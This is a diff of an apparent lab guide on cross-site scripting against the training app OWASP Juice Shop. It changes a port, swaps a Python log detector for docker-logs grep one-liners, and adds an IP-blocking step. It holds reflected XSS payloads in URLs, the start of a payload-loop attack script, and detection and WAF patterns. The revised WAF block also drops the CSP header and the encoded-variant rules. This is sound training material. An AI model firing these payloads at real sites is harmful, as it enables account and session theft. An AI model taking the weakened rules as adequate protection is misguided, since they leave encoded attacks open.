@@ -8,13 +8,13 @@
 ```html
 <iframe src="javascript:alert('XSS')">
 ```
-**URL:** `http://<VPS_IP>:8000/#/search?q=<iframe src="javascript:alert('XSS')">`
+**URL:** `http://<VPS_IP>:8080/#/search?q=<iframe src="javascript:alert('XSS')">`
 
 #### 2. Track Order (Reflected XSS)
 ```html
 <iframe src="javascript:alert('XSS')">
 ```
-**URL:** `http://<VPS_IP>:8000/#/track-result?id=<iframe src="javascript:alert('XSS')">`
+**URL:** `http://<VPS_IP>:8080/#/track-result?id=<iframe src="javascript:alert('XSS')">`
 
 #### 3. Without Script Tags
 ```html
@@ -62,7 +62,7 @@
 ```bash
 #!/bin/bash
 # xss_attack.sh
-TARGET="http://<VPS_IP>:8000"
+TARGET="http://<VPS_IP>:8080"
 
 declare -a PAYLOADS=(
     "<script>alert(1)</script>"
@@ -102,133 +102,68 @@ done
 
 #### Real-Time XSS Detection
 ```bash
-tail -f ./logs/nginx/access.log | \
-    grep -iE "(<script|javascript:|onerror=|onload=|<iframe|<svg)"
+docker logs -f nginx-proxy 2>&1 | \
+    grep -iE "(script|javascript:|onerror=|onload=|iframe|svg)"
 ```
 
 #### Count XSS Attempts
 ```bash
-grep -ciE "(<script|javascript:|onerror|onload|<iframe|<svg|<img.*onerror)" \
-    ./logs/nginx/access.log
+docker logs nginx-proxy 2>&1 | \
+    grep -ciE "(script|javascript:|onerror|onload|iframe|svg)"
 ```
 
-#### Extract Unique Payloads
+#### Find Attacker IPs
 ```bash
-grep -oiE "q=[^& ]+" ./logs/nginx/access.log | \
-    cut -d= -f2 | \
-    python3 -c "import sys,urllib.parse; \
-        [print(urllib.parse.unquote_plus(l.strip())) for l in sys.stdin]" | \
-    sort -u
+docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror)" | \
+    awk '{print $1}' | sort | uniq -c | sort -rn
 ```
 
-### Complete XSS Detection Script
+### Simple XSS Detection Script
 
-```python
-#!/usr/bin/env python3
-# xss_detector.py
+```bash
+#!/bin/bash
+# xss_detector.sh
 
-import re
-import sys
-from urllib.parse import unquote_plus
+echo "🔍 XSS Detection Active..."
 
-XSS_PATTERNS = [
-    r'<script',
-    r'javascript:',
-    r'onerror\s*=',
-    r'onload\s*=',
-    r'onmouseover\s*=',
-    r'onclick\s*=',
-    r'onfocus\s*=',
-    r'<iframe',
-    r'<svg',
-    r'<img[^>]+onerror',
-    r'<body[^>]+onload',
-    r'<input[^>]+onfocus',
-    r'document\.cookie',
-    r'eval\s*\(',
-]
-
-def detect_xss(log_line):
-    """Check if log line contains XSS attempt"""
-    decoded = unquote_plus(log_line)
-    
-    for pattern in XSS_PATTERNS:
-        if re.search(pattern, decoded, re.IGNORECASE):
-            return pattern
-    return None
-
-def main():
-    xss_count = 0
-    attacker_ips = {}
-    
-    log_file = sys.argv[1] if len(sys.argv) > 1 else './logs/nginx/access.log'
-    
-    with open(log_file, 'r') as f:
-        for line in f:
-            pattern = detect_xss(line)
-            if pattern:
-                xss_count += 1
-                # Extract IP (first field)
-                ip = line.split()[0] if line.split() else 'unknown'
-                attacker_ips[ip] = attacker_ips.get(ip, 0) + 1
-                print(f"[XSS] Pattern: {pattern}")
-                print(f"      IP: {ip}")
-                print(f"      Line: {line.strip()[:100]}...")
-                print()
-    
-    print(f"\n=== Summary ===")
-    print(f"Total XSS attempts: {xss_count}")
-    print(f"\nTop attackers:")
-    for ip, count in sorted(attacker_ips.items(), key=lambda x: -x[1])[:5]:
-        print(f"  {ip}: {count} attempts")
-
-if __name__ == '__main__':
-    main()
+docker logs -f nginx-proxy 2>&1 | while read line; do
+    if echo "$line" | grep -qiE "(script|javascript:|onerror|onload|iframe|svg)"; then
+        echo "⚠️  XSS DETECTED: $line"
+    fi
+done
 ```
 
-### WAF Rules for Nginx
+### Blocking Attacker via Docker
+
+```bash
+# Find attacker IP
+ATTACKER=$(docker logs nginx-proxy 2>&1 | grep -iE "(script|onerror)" | \
+    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')
+
+echo "Blocking XSS attacker: $ATTACKER"
+
+# Block inside nginx container
+docker exec nginx-proxy sh -c "echo 'deny $ATTACKER;' >> /etc/nginx/blocked.conf"
+docker exec nginx-proxy nginx -s reload
+```
+
+### WAF Rules for Nginx (Optional Advanced)
 
 ```nginx
-# /etc/nginx/conf.d/waf_xss.conf
-
-# XSS blocking location block
+# XSS blocking rules (add to nginx.conf if you have server access)
 location / {
-    # Block script tags (normal and encoded)
-    if ($request_uri ~* "(<script|%3Cscript|%253Cscript)") {
-        return 403;
-    }
-    
-    # Block javascript: protocol
-    if ($request_uri ~* "(javascript:|javascript%3A)") {
+    # Block script tags
+    if ($request_uri ~* "(script|javascript:)") {
         return 403;
     }
     
     # Block event handlers
-    if ($request_uri ~* "(onerror|onload|onmouseover|onclick|onfocus|onblur)(\s|%20)*=") {
+    if ($request_uri ~* "(onerror|onload|onclick)=") {
         return 403;
     }
-    
-    # Block iframe injection
-    if ($request_uri ~* "(<iframe|%3Ciframe)") {
-        return 403;
-    }
-    
-    # Block SVG XSS
-    if ($request_uri ~* "(<svg|%3Csvg)") {
-        return 403;
-    }
-    
-    # Block document.cookie access
-    if ($request_uri ~* "document(\.|\%2E)cookie") {
-        return 403;
-    }
-    
-    # Add security headers
-    add_header X-XSS-Protection "1; mode=block" always;
-    add_header X-Content-Type-Options "nosniff" always;
-    add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
     
     proxy_pass http://juice-shop:3000;
+    add_header X-XSS-Protection "1; mode=block" always;
 }
 ```
 
